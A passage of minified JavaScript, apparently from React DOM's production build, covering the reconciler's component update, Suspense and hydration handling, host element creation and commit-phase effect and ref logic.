o=o===null?null:{parent:we._currentValue,pool:o},a.memoizedState={baseLanes:t,cachePool:o},e!==null&&fo(a,null),hn(),sm(a),e!==null&&os(e,a,s,!0),null}function No(e,a){var t=a.ref;if(t===null)e!==null&&e.ref!==null&&(a.flags|=4194816);else{if(typeof t!="function"&&typeof t!="object")throw Error(m(284));(e===null||e.ref!==t)&&(a.flags|=4194816)}}function wn(e,a,t,s,o){return Hr(a),t=gn(e,a,t,s,void 0,o),s=vn(),e!==null&&!ke?(jn(e,a,o),Qa(e,a,o)):(le&&s&&en(a),a.flags|=1,He(e,a,t,o),a.child)}function vm(e,a,t,s,o,n){return Hr(a),a.updateQueue=null,t=gd(a,s,t,o),bd(e),s=vn(),e!==null&&!ke?(jn(e,a,n),Qa(e,a,n)):(le&&s&&en(a),a.flags|=1,He(e,a,t,n),a.child)}function jm(e,a,t,s,o){if(Hr(a),a.stateNode===null){var n=gt,c=t.contextType;typeof c=="object"&&c!==null&&(n=We(c)),n=new t(s,n),a.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=Ln,a.stateNode=n,n._reactInternals=a,n=a.stateNode,n.props=s,n.state=a.memoizedState,n.refs={},mn(a),c=t.contextType,n.context=typeof c=="object"&&c!==null?We(c):gt,n.state=a.memoizedState,c=t.getDerivedStateFromProps,typeof c=="function"&&(Nn(a,t,c,s),n.state=a.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof n.getSnapshotBeforeUpdate=="function"||typeof n.UNSAFE_componentWillMount!="function"&&typeof n.componentWillMount!="function"||(c=n.state,typeof n.componentWillMount=="function"&&n.componentWillMount(),typeof n.UNSAFE_componentWillMount=="function"&&n.UNSAFE_componentWillMount(),c!==n.state&&Ln.enqueueReplaceState(n,n.state,null),us(a,s,n,o),ms(),n.state=a.memoizedState),typeof n.componentDidMount=="function"&&(a.flags|=4194308),s=!0}else if(e===null){n=a.stateNode;var x=a.memoizedProps,p=Yr(t,x);n.props=p;var v=n.context,C=t.contextType;c=gt,typeof C=="object"&&C!==null&&(c=We(C));var M=t.getDerivedStateFromProps;C=typeof M=="function"||typeof n.getSnapshotBeforeUpdate=="function",x=a.pendingProps!==x,C||typeof n.UNSAFE_componentWillReceiveProps!="function"&&typeof n.componentWillReceiveProps!="function"||(x||v!==c)&&im(a,n,s,c),lr=!1;var y=a.memoizedState;n.state=y,us(a,s,n,o),ms(),v=a.memoizedState,x||y!==v||lr?(typeof M=="function"&&(Nn(a,t,M,s),v=a.memoizedState),(p=lr||om(a,t,p,s,y,v,c))?(C||typeof n.UNSAFE_componentWillMount!="function"&&typeof n.componentWillMount!="function"||(typeof n.componentWillMount=="function"&&n.componentWillMount(),typeof n.UNSAFE_componentWillMount=="function"&&n.UNSAFE_componentWillMount()),typeof n.componentDidMount=="function"&&(a.flags|=4194308)):(typeof n.componentDidMount=="function"&&(a.flags|=4194308),a.memoizedProps=s,a.memoizedState=v),n.props=s,n.state=v,n.context=c,s=p):(typeof n.componentDidMount=="function"&&(a.flags|=4194308),s=!1)}else{n=a.stateNode,un(e,a),c=a.memoizedProps,C=Yr(t,c),n.props=C,M=a.pendingProps,y=n.context,v=t.contextType,p=gt,typeof v=="object"&&v!==null&&(p=We(v)),x=t.getDerivedStateFromProps,(v=typeof x=="function"||typeof n.getSnapshotBeforeUpdate=="function")||typeof n.UNSAFE_componentWillReceiveProps!="function"&&typeof n.componentWillReceiveProps!="function"||(c!==M||y!==p)&&im(a,n,s,p),lr=!1,y=a.memoizedState,n.state=y,us(a,s,n,o),ms();var S=a.memoizedState;c!==M||y!==S||lr||e!==null&&e.dependencies!==null&&po(e.dependencies)?(typeof x=="function"&&(Nn(a,t,x,s),S=a.memoizedState),(C=lr||om(a,t,C,s,y,S,p)||e!==null&&e.dependencies!==null&&po(e.dependencies))?(v||typeof n.UNSAFE_componentWillUpdate!="function"&&typeof n.componentWillUpdate!="function"||(typeof n.componentWillUpdate=="function"&&n.componentWillUpdate(s,S,p),typeof n.UNSAFE_componentWillUpdate=="function"&&n.UNSAFE_componentWillUpdate(s,S,p)),typeof n.componentDidUpdate=="function"&&(a.flags|=4),typeof n.getSnapshotBeforeUpdate=="function"&&(a.flags|=1024)):(typeof n.componentDidUpdate!="function"||c===e.memoizedProps&&y===e.memoizedState||(a.flags|=4),typeof n.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&y===e.memoizedState||(a.flags|=1024),a.memoizedProps=s,a.memoizedState=S),n.props=s,n.state=S,n.context=p,s=C):(typeof n.componentDidUpdate!="function"||c===e.memoizedProps&&y===e.memoizedState||(a.flags|=4),typeof n.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&y===e.memoizedState||(a.flags|=1024),s=!1)}return n=s,No(e,a),s=(a.flags&128)!==0,n||s?(n=a.stateNode,t=s&&typeof t.getDerivedStateFromError!="function"?null:n.render(),a.flags|=1,e!==null&&s?(a.child=Mt(a,e.child,null,o),a.child=Mt(a,null,t,o)):He(e,a,t,o),a.memoizedState=n.state,e=a.child):e=Qa(e,a,o),e}function ym(e,a,t,s){return ts(),a.flags|=256,He(e,a,t,s),a.child}var Xn={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Bn(e){return{baseLanes:e,cachePool:ld()}}function Pn(e,a,t){return e=e!==null?e.childLanes&~t:0,a&&(e|=Sa),e}function Sm(e,a,t){var s=a.pendingProps,o=!1,n=(a.flags&128)!==0,c;if((c=n)||(c=e!==null&&e.memoizedState===null?!1:(Xe.current&2)!==0),c&&(o=!0,a.flags&=-129),c=(a.flags&32)!==0,a.flags&=-33,e===null){if(le){if(o?ur(a):xr(),le){var x=Ce,p;if(p=x){e:{for(p=x,x=Oa;p.nodeType!==8;){if(!x){x=null;break e}if(p=Ca(p.nextSibling),p===null){x=null;break e}}x=p}x!==null?(a.memoizedState={dehydrated:x,treeContext:Ir!==null?{id:ka,overflow:Fa}:null,retryLane:536870912,hydrationErrors:null},p=ca(18,null,null,0),p.stateNode=x,p.return=a,a.child=p,$e=a,Ce=null,p=!0):p=!1}p||Gr(a)}if(x=a.memoizedState,x!==null&&(x=x.dehydrated,x!==null))return Sl(x)?a.lanes=32:a.lanes=536870912,null;Za(a)}return x=s.children,s=s.fallback,o?(xr(),o=a.mode,x=Lo({mode:"hidden",children:x},o),s=Ur(s,o,t,null),x.return=a,s.return=a,x.sibling=s,a.child=x,o=a.child,o.memoizedState=Bn(t),o.childLanes=Pn(e,c,t),a.memoizedState=Xn,s):(ur(a),Un(a,x))}if(p=e.memoizedState,p!==null&&(x=p.dehydrated,x!==null)){if(n)a.flags&256?(ur(a),a.flags&=-257,a=In(e,a,t)):a.memoizedState!==null?(xr(),a.child=e.child,a.flags|=128,a=null):(xr(),o=s.fallback,x=a.mode,s=Lo({mode:"visible",children:s.children},x),o=Ur(o,x,t,null),o.flags|=2,s.return=a,o.return=a,s.sibling=o,a.child=s,Mt(a,e.child,null,t),s=a.child,s.memoizedState=Bn(t),s.childLanes=Pn(e,c,t),a.memoizedState=Xn,a=o);else if(ur(a),Sl(x)){if(c=x.nextSibling&&x.nextSibling.dataset,c)var v=c.dgst;c=v,s=Error(m(419)),s.stack="",s.digest=c,ss({value:s,source:null,stack:null}),a=In(e,a,t)}else if(ke||os(e,a,t,!1),c=(t&e.childLanes)!==0,ke||c){if(c=ve,c!==null&&(s=t&-t,s=(s&42)!==0?1:Si(s),s=(s&(c.suspendedLanes|t))!==0?0:s,s!==0&&s!==p.retryLane))throw p.retryLane=s,bt(e,s),pa(c,e,s),xm;x.data==="$?"||ol(),a=In(e,a,t)}else x.data==="$?"?(a.flags|=192,a.child=e.child,a=null):(e=p.treeContext,Ce=Ca(x.nextSibling),$e=a,le=!0,Fr=null,Oa=!1,e!==null&&(va[ja++]=ka,va[ja++]=Fa,va[ja++]=Ir,ka=e.id,Fa=e.overflow,Ir=a),a=Un(a,s.children),a.flags|=4096);return a}return o?(xr(),o=s.fallback,x=a.mode,p=e.child,v=p.sibling,s=Ia(p,{mode:"hidden",children:s.children}),s.subtreeFlags=p.subtreeFlags&65011712,v!==null?o=Ia(v,o):(o=Ur(o,x,t,null),o.flags|=2),o.return=a,s.return=a,s.sibling=o,a.child=s,s=o,o=a.child,x=e.child.memoizedState,x===null?x=Bn(t):(p=x.cachePool,p!==null?(v=we._currentValue,p=p.parent!==v?{parent:v,pool:v}:p):p=ld(),x={baseLanes:x.baseLanes|t,cachePool:p}),o.memoizedState=x,o.childLanes=Pn(e,c,t),a.memoizedState=Xn,s):(ur(a),t=e.child,e=t.sibling,t=Ia(t,{mode:"visible",children:s.children}),t.return=a,t.sibling=null,e!==null&&(c=a.deletions,c===null?(a.deletions=[e],a.flags|=16):c.push(e)),a.child=t,a.memoizedState=null,t)}function Un(e,a){return a=Lo({mode:"visible",children:a},e.mode),a.return=e,e.child=a}function Lo(e,a){return e=ca(22,e,null,a),e.lanes=0,e.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null},e}function In(e,a,t){return Mt(a,e.child,null,t),e=Un(a,a.pendingProps.children),e.flags|=2,a.memoizedState=null,e}function Am(e,a,t){e.lanes|=a;var s=e.alternate;s!==null&&(s.lanes|=a),sn(e.return,a,t)}function kn(e,a,t,s,o){var n=e.memoizedState;n===null?e.memoizedState={isBackwards:a,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:o}:(n.isBackwards=a,n.rendering=null,n.renderingStartTime=0,n.last=s,n.tail=t,n.tailMode=o)}function Rm(e,a,t){var s=a.pendingProps,o=s.revealOrder,n=s.tail;if(He(e,a,s.children,t),s=Xe.current,(s&2)!==0)s=s&1|2,a.flags|=128;else{if(e!==null&&(e.flags&128)!==0)e:for(e=a.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Am(e,t,a);else if(e.tag===19)Am(e,t,a);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===a)break e;for(;e.sibling===null;){if(e.return===null||e.return===a)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}switch(ne(Xe,s),o){case"forwards":for(t=a.child,o=null;t!==null;)e=t.alternate,e!==null&&Do(e)===null&&(o=t),t=t.sibling;t=o,t===null?(o=a.child,a.child=null):(o=t.sibling,t.sibling=null),kn(a,!1,o,t,n);break;case"backwards":for(t=null,o=a.child,a.child=null;o!==null;){if(e=o.alternate,e!==null&&Do(e)===null){a.child=o;break}e=o.sibling,o.sibling=t,t=o,o=e}kn(a,!0,t,null,n);break;case"together":kn(a,!1,null,null,void 0);break;default:a.memoizedState=null}return a.child}function Qa(e,a,t){if(e!==null&&(a.dependencies=e.dependencies),gr|=a.lanes,(t&a.childLanes)===0)if(e!==null){if(os(e,a,t,!1),(t&a.childLanes)===0)return null}else return null;if(e!==null&&a.child!==e.child)throw Error(m(153));if(a.child!==null){for(e=a.child,t=Ia(e,e.pendingProps),a.child=t,t.return=a;e.sibling!==null;)e=e.sibling,t=t.sibling=Ia(e,e.pendingProps),t.return=a;t.sibling=null}return a.child}function Fn(e,a){return(e.lanes&a)!==0?!0:(e=e.dependencies,!!(e!==null&&po(e)))}function Mh(e,a,t){switch(a.tag){case 3:Nr(a,a.stateNode.containerInfo),nr(a,we,e.memoizedState.cache),ts();break;case 27:case 5:rt(a);break;case 4:Nr(a,a.stateNode.containerInfo);break;case 10:nr(a,a.type,a.memoizedProps.value);break;case 13:var s=a.memoizedState;if(s!==null)return s.dehydrated!==null?(ur(a),a.flags|=128,null):(t&a.child.childLanes)!==0?Sm(e,a,t):(ur(a),e=Qa(e,a,t),e!==null?e.sibling:null);ur(a);break;case 19:var o=(e.flags&128)!==0;if(s=(t&a.childLanes)!==0,s||(os(e,a,t,!1),s=(t&a.childLanes)!==0),o){if(s)return Rm(e,a,t);a.flags|=128}if(o=a.memoizedState,o!==null&&(o.rendering=null,o.tail=null,o.lastEffect=null),ne(Xe,Xe.current),s)break;return null;case 22:case 23:return a.lanes=0,bm(e,a,t);case 24:nr(a,we,e.memoizedState.cache)}return Qa(e,a,t)}function Em(e,a,t){if(e!==null)if(e.memoizedProps!==a.pendingProps)ke=!0;else{if(!Fn(e,t)&&(a.flags&128)===0)return ke=!1,Mh(e,a,t);ke=(e.flags&131072)!==0}else ke=!1,le&&(a.flags&1048576)!==0&&ad(a,xo,a.index);switch(a.lanes=0,a.tag){case 16:e:{e=a.pendingProps;var s=a.elementType,o=s._init;if(s=o(s._payload),a.type=s,typeof s=="function")Wi(s)?(e=Yr(s,e),a.tag=1,a=jm(null,a,s,e,t)):(a.tag=0,a=wn(null,a,s,e,t));else{if(s!=null){if(o=s.$$typeof,o===Te){a.tag=11,a=pm(null,a,s,e,t);break e}else if(o===Je){a.tag=14,a=hm(null,a,s,e,t);break e}}throw a=wa(s)||s,Error(m(306,a,""))}}return a;case 0:return wn(e,a,a.type,a.pendingProps,t);case 1:return s=a.type,o=Yr(s,a.pendingProps),jm(e,a,s,o,t);case 3:e:{if(Nr(a,a.stateNode.containerInfo),e===null)throw Error(m(387));s=a.pendingProps;var n=a.memoizedState;o=n.element,un(e,a),us(a,s,null,t);var c=a.memoizedState;if(s=c.cache,nr(a,we,s),s!==n.cache&&on(a,[we],t,!0),ms(),s=c.element,n.isDehydrated)if(n={element:s,isDehydrated:!1,cache:c.cache},a.updateQueue.baseState=n,a.memoizedState=n,a.flags&256){a=ym(e,a,s,t);break e}else if(s!==o){o=ba(Error(m(424)),a),ss(o),a=ym(e,a,s,t);break e}else for(e=a.stateNode.containerInfo,e.nodeType===9?e=e.body:e=e.nodeName==="HTML"?e.ownerDocument.body:e,Ce=Ca(e.firstChild),$e=a,le=!0,Fr=null,Oa=!0,t=tm(a,null,s,t),a.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(ts(),s===o){a=Qa(e,a,t);break e}He(e,a,s,t)}a=a.child}return a;case 26:return No(e,a),e===null?(t=Ou(a.type,null,a.pendingProps,null))?a.memoizedState=t:le||(t=a.type,e=a.pendingProps,s=Qo(Se.current).createElement(t),s[Ke]=a,s[aa]=e,Qe(s,t,e),Ie(s),a.stateNode=s):a.memoizedState=Ou(a.type,e.memoizedProps,a.pendingProps,e.memoizedState),null;case 27:return rt(a),e===null&&le&&(s=a.stateNode=Cu(a.type,a.pendingProps,Se.current),$e=a,Oa=!0,o=Ce,Sr(a.type)?(Al=o,Ce=Ca(s.firstChild)):Ce=o),He(e,a,a.pendingProps.children,t),No(e,a),e===null&&(a.flags|=4194304),a.child;case 5:return e===null&&le&&((o=s=Ce)&&(s=rf(s,a.type,a.pendingProps,Oa),s!==null?(a.stateNode=s,$e=a,Ce=Ca(s.firstChild),Oa=!1,o=!0):o=!1),o||Gr(a)),rt(a),o=a.type,n=a.pendingProps,c=e!==null?e.memoizedProps:null,s=n.children,vl(o,n)?s=null:c!==null&&vl(o,c)&&(a.flags|=32),a.memoizedState!==null&&(o=gn(e,a,jh,null,null,t),Ls._currentValue=o),No(e,a),He(e,a,s,t),a.child;case 6:return e===null&&le&&((e=t=Ce)&&(t=tf(t,a.pendingProps,Oa),t!==null?(a.stateNode=t,$e=a,Ce=null,e=!0):e=!1),e||Gr(a)),null;case 13:return Sm(e,a,t);case 4:return Nr(a,a.stateNode.containerInfo),s=a.pendingProps,e===null?a.child=Mt(a,null,s,t):He(e,a,s,t),a.child;case 11:return pm(e,a,a.type,a.pendingProps,t);case 7:return He(e,a,a.pendingProps,t),a.child;case 8:return He(e,a,a.pendingProps.children,t),a.child;case 12:return He(e,a,a.pendingProps.children,t),a.child;case 10:return s=a.pendingProps,nr(a,a.type,s.value),He(e,a,s.children,t),a.child;case 9:return o=a.type._context,s=a.pendingProps.children,Hr(a),o=We(o),s=s(o),a.flags|=1,He(e,a,s,t),a.child;case 14:return hm(e,a,a.type,a.pendingProps,t);case 15:return fm(e,a,a.type,a.pendingProps,t);case 19:return Rm(e,a,t);case 31:return s=a.pendingProps,t=a.mode,s={mode:s.mode,children:s.children},e===null?(t=Lo(s,t),t.ref=a.ref,a.child=t,t.return=a,a=t):(t=Ia(e.child,s),t.ref=a.ref,a.child=t,t.return=a,a=t),a;case 22:return bm(e,a,t);case 24:return Hr(a),s=We(we),e===null?(o=cn(),o===null&&(o=ve,n=nn(),o.pooledCache=n,n.refCount++,n!==null&&(o.pooledCacheLanes|=t),o=n),a.memoizedState={parent:s,cache:o},mn(a),nr(a,we,o)):((e.lanes&t)!==0&&(un(e,a),us(a,null,null,t),ms()),o=e.memoizedState,n=a.memoizedState,o.parent!==s?(o={parent:s,cache:s},a.memoizedState=o,a.lanes===0&&(a.memoizedState=a.updateQueue.baseState=o),nr(a,we,s)):(s=n.cache,nr(a,we,s),s!==o.cache&&on(a,[we],t,!0))),He(e,a,a.pendingProps.children,t),a.child;case 29:throw a.pendingProps}throw Error(m(156,a.tag))}function Ya(e){e.flags|=4}function Cm(e,a){if(a.type!=="stylesheet"||(a.state.loading&4)!==0)e.flags&=-16777217;else if(e.flags|=16777216,!Lu(a)){if(a=ya.current,a!==null&&((te&4194048)===te?Da!==null:(te&62914560)!==te&&(te&536870912)===0||a!==Da))throw cs=dn,cd;e.flags|=8192}}function zo(e,a){a!==null&&(e.flags|=4),e.flags&16384&&(a=e.tag!==22?sc():536870912,e.lanes|=a,qt|=a)}function vs(e,a){if(!le)switch(e.tailMode){case"hidden":a=e.tail;for(var t=null;a!==null;)a.alternate!==null&&(t=a),a=a.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?a||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function Re(e){var a=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(a)for(var o=e.child;o!==null;)t|=o.lanes|o.childLanes,s|=o.subtreeFlags&65011712,s|=o.flags&65011712,o.return=e,o=o.sibling;else for(o=e.child;o!==null;)t|=o.lanes|o.childLanes,s|=o.subtreeFlags,s|=o.flags,o.return=e,o=o.sibling;return e.subtreeFlags|=s,e.childLanes=t,a}function Oh(e,a,t){var s=a.pendingProps;switch(an(a),a.tag){case 31:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Re(a),null;case 1:return Re(a),null;case 3:return t=a.stateNode,s=null,e!==null&&(s=e.memoizedState.cache),a.memoizedState.cache!==s&&(a.flags|=2048),Va(we),je(),t.pendingContext&&(t.context=t.pendingContext,t.pendingContext=null),(e===null||e.child===null)&&(rs(a)?Ya(a):e===null||e.memoizedState.isDehydrated&&(a.flags&256)===0||(a.flags|=1024,sd())),Re(a),null;case 26:return t=a.memoizedState,e===null?(Ya(a),t!==null?(Re(a),Cm(a,t)):(Re(a),a.flags&=-16777217)):t?t!==e.memoizedState?(Ya(a),Re(a),Cm(a,t)):(Re(a),a.flags&=-16777217):(e.memoizedProps!==s&&Ya(a),Re(a),a.flags&=-16777217),null;case 27:Ba(a),t=Se.current;var o=a.type;if(e!==null&&a.stateNode!=null)e.memoizedProps!==s&&Ya(a);else{if(!s){if(a.stateNode===null)throw Error(m(166));return Re(a),null}e=Ee.current,rs(a)?rd(a):(e=Cu(o,s,t),a.stateNode=e,Ya(a))}return Re(a),null;case 5:if(Ba(a),t=a.type,e!==null&&a.stateNode!=null)e.memoizedProps!==s&&Ya(a);else{if(!s){if(a.stateNode===null)throw Error(m(166));return Re(a),null}if(e=Ee.current,rs(a))rd(a);else{switch(o=Qo(Se.current),e){case 1:e=o.createElementNS("http://www.w3.org/2000/svg",t);break;case 2:e=o.createElementNS("http://www.w3.org/1998/Math/MathML",t);break;default:switch(t){case"svg":e=o.createElementNS("http://www.w3.org/2000/svg",t);break;case"math":e=o.createElementNS("http://www.w3.org/1998/Math/MathML",t);break;case"script":e=o.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild);break;case"select":e=typeof s.is=="string"?o.createElement("select",{is:s.is}):o.createElement("select"),s.multiple?e.multiple=!0:s.size&&(e.size=s.size);break;default:e=typeof s.is=="string"?o.createElement(t,{is:s.is}):o.createElement(t)}}e[Ke]=a,e[aa]=s;e:for(o=a.child;o!==null;){if(o.tag===5||o.tag===6)e.appendChild(o.stateNode);else if(o.tag!==4&&o.tag!==27&&o.child!==null){o.child.return=o,o=o.child;continue}if(o===a)break e;for(;o.sibling===null;){if(o.return===null||o.return===a)break e;o=o.return}o.sibling.return=o.return,o=o.sibling}a.stateNode=e;e:switch(Qe(e,t,s),t){case"button":case"input":case"select":case"textarea":e=!!s.autoFocus;break e;case"img":e=!0;break e;default:e=!1}e&&Ya(a)}}return Re(a),a.flags&=-16777217,null;case 6:if(e&&a.stateNode!=null)e.memoizedProps!==s&&Ya(a);else{if(typeof s!="string"&&a.stateNode===null)throw Error(m(166));if(e=Se.current,rs(a)){if(e=a.stateNode,t=a.memoizedProps,s=null,o=$e,o!==null)switch(o.tag){case 27:case 5:s=o.memoizedProps}e[Ke]=a,e=!!(e.nodeValue===t||s!==null&&s.suppressHydrationWarning===!0||vu(e.nodeValue,t)),e||Gr(a)}else e=Qo(e).createTextNode(s),e[Ke]=a,a.stateNode=e}return Re(a),null;case 13:if(s=a.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(o=rs(a),s!==null&&s.dehydrated!==null){if(e===null){if(!o)throw Error(m(318));if(o=a.memoizedState,o=o!==null?o.dehydrated:null,!o)throw Error(m(317));o[Ke]=a}else ts(),(a.flags&128)===0&&(a.memoizedState=null),a.flags|=4;Re(a),o=!1}else o=sd(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=o),o=!0;if(!o)return a.flags&256?(Za(a),a):(Za(a),null)}if(Za(a),(a.flags&128)!==0)return a.lanes=t,a;if(t=s!==null,e=e!==null&&e.memoizedState!==null,t){s=a.child,o=null,s.alternate!==null&&s.alternate.memoizedState!==null&&s.alternate.memoizedState.cachePool!==null&&(o=s.alternate.memoizedState.cachePool.pool);var n=null;s.memoizedState!==null&&s.memoizedState.cachePool!==null&&(n=s.memoizedState.cachePool.pool),n!==o&&(s.flags|=2048)}return t!==e&&t&&(a.child.flags|=8192),zo(a,a.updateQueue),Re(a),null;case 4:return je(),e===null&&pl(a.stateNode.containerInfo),Re(a),null;case 10:return Va(a.type),Re(a),null;case 19:if(be(Xe),o=a.memoizedState,o===null)return Re(a),null;if(s=(a.flags&128)!==0,n=o.rendering,n===null)if(s)vs(o,!1);else{if(_e!==0||e!==null&&(e.flags&128)!==0)for(e=a.child;e!==null;){if(n=Do(e),n!==null){for(a.flags|=128,vs(o,!1),e=n.updateQueue,a.updateQueue=e,zo(a,e),a.subtreeFlags=0,e=t,t=a.child;t!==null;)ed(t,e),t=t.sibling;return ne(Xe,Xe.current&1|2),a.child}e=e.sibling}o.tail!==null&&Ma()>Bo&&(a.flags|=128,s=!0,vs(o,!1),a.lanes=4194304)}else{if(!s)if(e=Do(n),e!==null){if(a.flags|=128,s=!0,e=e.updateQueue,a.updateQueue=e,zo(a,e),vs(o,!0),o.tail===null&&o.tailMode==="hidden"&&!n.alternate&&!le)return Re(a),null}else 2*Ma()-o.renderingStartTime>Bo&&t!==536870912&&(a.flags|=128,s=!0,vs(o,!1),a.lanes=4194304);o.isBackwards?(n.sibling=a.child,a.child=n):(e=o.last,e!==null?e.sibling=n:a.child=n,o.last=n)}return o.tail!==null?(a=o.tail,o.rendering=a,o.tail=a.sibling,o.renderingStartTime=Ma(),a.sibling=null,e=Xe.current,ne(Xe,s?e&1|2:e&1),a):(Re(a),null);case 22:case 23:return Za(a),fn(),s=a.memoizedState!==null,e!==null?e.memoizedState!==null!==s&&(a.flags|=8192):s&&(a.flags|=8192),s?(t&536870912)!==0&&(a.flags&128)===0&&(Re(a),a.subtreeFlags&6&&(a.flags|=8192)):Re(a),t=a.updateQueue,t!==null&&zo(a,t.retryQueue),t=null,e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(t=e.memoizedState.cachePool.pool),s=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(s=a.memoizedState.cachePool.pool),s!==t&&(a.flags|=2048),e!==null&&be(Zr),null;case 24:return t=null,e!==null&&(t=e.memoizedState.cache),a.memoizedState.cache!==t&&(a.flags|=2048),Va(we),Re(a),null;case 25:return null;case 30:return null}throw Error(m(156,a.tag))}function Dh(e,a){switch(an(a),a.tag){case 1:return e=a.flags,e&65536?(a.flags=e&-65537|128,a):null;case 3:return Va(we),je(),e=a.flags,(e&65536)!==0&&(e&128)===0?(a.flags=e&-65537|128,a):null;case 26:case 27:case 5:return Ba(a),null;case 13:if(Za(a),e=a.memoizedState,e!==null&&e.dehydrated!==null){if(a.alternate===null)throw Error(m(340));ts()}return e=a.flags,e&65536?(a.flags=e&-65537|128,a):null;case 19:return be(Xe),null;case 4:return je(),null;case 10:return Va(a.type),null;case 22:case 23:return Za(a),fn(),e!==null&&be(Zr),e=a.flags,e&65536?(a.flags=e&-65537|128,a):null;case 24:return Va(we),null;case 25:return null;default:return null}}function _m(e,a){switch(an(a),a.tag){case 3:Va(we),je();break;case 26:case 27:case 5:Ba(a);break;case 4:je();break;case 13:Za(a);break;case 19:be(Xe);break;case 10:Va(a.type);break;case 22:case 23:Za(a),fn(),e!==null&&be(Zr);break;case 24:Va(we)}}function js(e,a){try{var t=a.updateQueue,s=t!==null?t.lastEffect:null;if(s!==null){var o=s.next;t=o;do{if((t.tag&e)===e){s=void 0;var n=t.create,c=t.inst;s=n(),c.destroy=s}t=t.next}while(t!==o)}}catch(x){he(a,a.return,x)}}function pr(e,a,t){try{var s=a.updateQueue,o=s!==null?s.lastEffect:null;if(o!==null){var n=o.next;s=n;do{if((s.tag&e)===e){var c=s.inst,x=c.destroy;if(x!==void 0){c.destroy=void 0,o=a;var p=t,v=x;try{v()}catch(C){he(o,p,C)}}}s=s.next}while(s!==n)}}catch(C){he(a,a.return,C)}}function Mm(e){var a=e.updateQueue;if(a!==null){var t=e.stateNode;try{hd(a,t)}catch(s){he(e,e.return,s)}}}function Om(e,a,t){t.props=Yr(e.type,e.memoizedProps),t.state=e.memoizedState;try{t.componentWillUnmount()}catch(s){he(e,a,s)}}function ys(e,a){try{var t=e.ref;if(t!==null){switch(e.tag){case 26:case 27:case 5:var s=e.stateNode;break;case 30:s=e.stateNode;break;default:s=e.stateNode}typeof t=="function"?e.refCleanup=t(s):t.current=s}}catch(o){he(e,a,o)}}function Ta(e,a){var t=e.ref,s=e.refCleanup;if(t!==null)if(typeof s=="function")try{s()}catch(o){he(e,a,o)}finally{e.refCleanup=null,e=e.alternate,e!=null&&(e.refCleanup=null)}else if(typeof t=="function")try{t(null)}catch(o){he(e,a,o)}else t.current=null}function Dm(e){var a=e.type,t=e.memoizedProps,s=e.stateNode;try{e:switch(a){case"button":case"input":case"select":case"textarea":t.autoFocus&&s.focus();break e;case"img":t.src?s.src=t.src:t.srcSet&&(s.srcset=t.srcSet)}}catch(o){he(e,e.return,o)}}function Gn(e,a,t){try{var s=e.stateNode;Wh(s,e.type,t,a),s[aa]=a}catch(o){he(e,e.return,o)}}function Tm(e){return e.tag===5||e.tag===3||e.tag===26||e.tag===27&&Sr(e.type)||e.tag===4}function Vn(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Tm(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.tag===27&&Sr(e.type)||e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Hn(e,a,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,a?(t.nodeType===9?t.body:t.nodeName==="HTML"?t.ownerDocument.body:t).insertBefore(e,a):(a=t.nodeType===9?t.body:t.nodeName==="HTML"?t.ownerDocument.body:t,a.appendChild(e),t=t._reactRootContainer,t!=null||a.onclick!==null||(a.onclick=Zo));else if(s!==4&&(s===27&&Sr(e.type)&&(t=e.stateNode,a=null),e=e.child,e!==null))for(Hn(e,a,t),e=e.sibling;e!==null;)Hn(e,a,t),e=e.sibling}function wo(e,a,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,a?t.insertBefore(e,a):t.appendChild(e);else if(s!==4&&(s===27&&Sr(e.type)&&(t=e.stateNode),e=e.child,e!==null))for(wo(e,a,t),e=e.sibling;e!==null;)wo(e,a,t),e=e.sibling}function qm(e){var a=e.stateNode,t=e.memoizedProps;try{for(var s=e.type,o=a.attributes;o.length;)a.removeAttributeNode(o[0]);Qe(a,s,t),a[Ke]=e,a[aa]=t}catch(n){he(e,e.return,n)}}var Ka=!1,De=!1,Zn=!1,Nm=typeof WeakSet=="function"?WeakSet:Set,Fe=null;function Th(e,a){if(e=e.containerInfo,bl=ei,e=Gc(e),Gi(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var o=s.anchorOffset,n=s.focusNode;s=s.focusOffset;try{t.nodeType,n.nodeType}catch{t=null;break e}var c=0,x=-1,p=-1,v=0,C=0,M=e,y=null;a:for(;;){for(var S;M!==t||o!==0&&M.nodeType!==3||(x=c+o),M!==n||s!==0&&M.nodeType!==3||(p=c+s),M.nodeType===3&&(c+=M.nodeValue.length),(S=M.firstChild)!==null;)y=M,M=S;for(;;){if(M===e)break a;if(y===t&&++v===o&&(x=c),y===n&&++C===s&&(p=c),(S=M.nextSibling)!==null)break;M=y,y=M.parentNode}M=S}t=x===-1||p===-1?null:{start:x,end:p}}else t=null}t=t||{start:0,end:0}}else 